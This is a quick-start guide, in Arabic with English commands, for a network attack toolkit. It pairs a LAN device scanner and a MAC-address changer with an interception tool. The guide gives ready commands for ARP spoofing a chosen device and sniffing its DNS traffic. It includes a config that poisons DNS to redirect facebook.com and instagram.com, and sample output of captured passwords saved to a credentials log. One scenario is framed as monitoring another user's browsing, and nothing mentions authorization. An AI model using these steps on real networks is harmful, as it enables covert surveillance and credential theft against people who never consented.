# WiFi Hunter - Quick Start Guide (الدليل السريع)

## 🚀 البدء السريع

### 1️⃣ تثبيت المكتبات

```bash
pip install -r requirements.txt
```

---

## 🛠️ الأداة الأولى: WiFi Hunter Scanner

### استخدام سريع:
```bash
# فحص شبكتك
python wifi_hunter.py -t 192.168.1.0/24
```

### أمثلة متقدمة:

**مثال 1: فحص مع تفاصيل**
```bash
python wifi_hunter.py -t 192.168.1.0/24 -v
```

**مثال 2: البحث عن جهاز معين**
```bash
python wifi_hunter.py -t 192.168.1.0/24 -search-ip 192.168.1.5
```

**مثال 3: تصفية أجهزة Apple فقط**
```bash
python wifi_hunter.py -t 192.168.1.0/24 -filter-vendor apple
```

**مثال 4: فحص مع إعادة محاولة**
```bash
python wifi_hunter.py -t 192.168.1.0/24 -retries 3 -timeout 5
```

---

## 🔧 الأداة الثانية: MAC Address Changer

### شغيل الأداة:

**Windows (PowerShell):**
```powershell
# تشغيل بصلاحيات Admin
powershell -ExecutionPolicy Bypass -File mac_simple.ps1
```

### الخطوات:
1. اختر عرض المحولات (List Adapters)
2. اختر تغيير MAC (Change MAC)
3. أدخل اسم المحول (مثل: Ethernet)
4. أدخل MAC جديد (مثل: AA:BB:CC:DD:EE:FF)
5. تأكيد التغيير

---

## 🎯 الأداة الثالثة: Professional Network Tools v3.0

### الوضع الكامل (الأفضل):
```bash
# يفعل ARP Spoofing + DNS Sniffer معاً
python professional_network_tools.py -t 192.168.1.100 -g 192.168.1.1
```

### الأوضاع المختلفة:

**1. ARP Spoofing فقط:**
```bash
python professional_network_tools.py -t 192.168.1.100 -g 192.168.1.1 -m spoof
```

**2. DNS Sniffer فقط:**
```bash
python professional_network_tools.py -t 192.168.1.100 -g 192.168.1.1 -m sniff
```

**3. الوضع المفصل:**
```bash
python professional_network_tools.py -t 192.168.1.100 -g 192.168.1.1 -v
```

**4. مع ملف إعدادات مخصص:**
```bash
python professional_network_tools.py -t 192.168.1.100 -g 192.168.1.1 -c config.json
```

---

## 📊 فهم المخرجات

### مثال من WiFi Hunter:
```
Device Found:
  IP: 192.168.1.5
  MAC: ac:9b:0a:xx:xx:xx
  Type: iPhone
  Vendor: Apple
```

### مثال من Professional Network Tools:
```
[09:15:32] DNS: google.com (تم التقاطها)
[09:15:33] DNS: ads.google.com [BLOCKED] (تم حجبها)
[!] CREDENTIALS FOUND! ['password123'] (تم العثور على كلمة مرور)
[+] Mobile Device: Apple iPhone/iPad (تم كشف جهاز محمول)
```

---

## 📁 ملفات السجلات

بعد تشغيل Professional Network Tools، ستجد:

```
logs/
├── dns_log_20240101_120000.txt      (استعلامات DNS)
├── sessions_20240101_120000.json    (الجلسات النشطة)
├── credentials_20240101_120000.txt  (بيانات الاعتماد)
└── stats_20240101_120000.json       (الإحصائيات)
```

---

## ⚙️ تخصيص config.json

### تفعيل DNS Poisoning:
```json
{
  "dns_poisoning": true,
  "fake_ips": {
    "facebook.com": "192.168.1.1",
    "instagram.com": "192.168.1.1"
  }
}
```

### إضافة مجالات للحجب:
```json
{
  "domain_blocking": true,
  "blocked_domains": [
    "youtube.com",
    "facebook.com",
    "twitter.com"
  ]
}
```

### تعطيل استخراج الأوراق الاعتمادية:
```json
{
  "credential_capture": false
}
```

---

## 🔍 أمثلة سيناريو كامل

### السيناريو 1: مراقبة تصفح المستخدم

```bash
# 1. ابدأ الماسح لمعرفة الأجهزة
python wifi_hunter.py -t 192.168.1.0/24

# 2. اختر جهاز (مثال: 192.168.1.100)

# 3. ابدأ المراقبة
python professional_network_tools.py -t 192.168.1.100 -g 192.168.1.1 -m sniff -v

# 4. شاهد النتائج:
# - DNS queries
# - Mobile devices
# - Credentials
```

### السيناريو 2: الاختبار على الشبكة المحلية

```bash
# 1. غير MAC الجهاز
powershell -ExecutionPolicy Bypass -File mac_simple.ps1
# اختر MAC عشوائي

# 2. ماسح الشبكة للتحقق
python wifi_hunter.py -t 192.168.1.0/24 -v

# 3. ابدأ الاختبار
python professional_network_tools.py -t 192.168.1.50 -g 192.168.1.1
```

---

## 🆘 استكشاف الأخطاء الشائعة

| المشكلة | الحل |
|--------|------|
| "No module named scapy" | `pip install scapy colorama` |
| "Permission Denied" | شغل الأداة بصلاحيات Admin |
| "IP غير صحيح" | تحقق من رقم IP باستخدام `ipconfig` |
| لا توجد نتائج | تأكد من أن الجهاز المستهدف متصل |
| لا يوجد DNS | قد يكون الجهاز يستخدم VPN أو DNS آمن |

---

## 💡 نصائح مفيدة

✅ استخدم `ipconfig` لمعرفة نطاق الشبكة الخاص بك

✅ جميع الأدوات تحتاج صلاحيات Admin على Windows

✅ استخدم `-v` للحصول على معلومات تفصيلية

✅ احفظ ملف config.json المخصص لكل سيناريو

✅ تحقق من ملفات السجل في مجلد `logs/` للتحليل اللاحق

---

## 📝 الملفات الرئيسية

```
📦 WiFi Hunter
├── 🔵 wifi_hunter.py               (ماسح الشبكة)
├── 🟣 mac_simple.ps1               (تغيير MAC)
├── 🟠 professional_network_tools.py (أداة الاعتراض)
├── ⚙️  config.json                  (الإعدادات)
├── 📋 requirements.txt              (المكتبات)
├── 📖 README.md                     (الوثائق الكاملة)
├── 🚀 QUICKSTART.md                 (هذا الملف)
└── 📊 test_suite.py                 (الاختبارات)
```

---

**Ready to go! ابدأ الآن!** 🚀
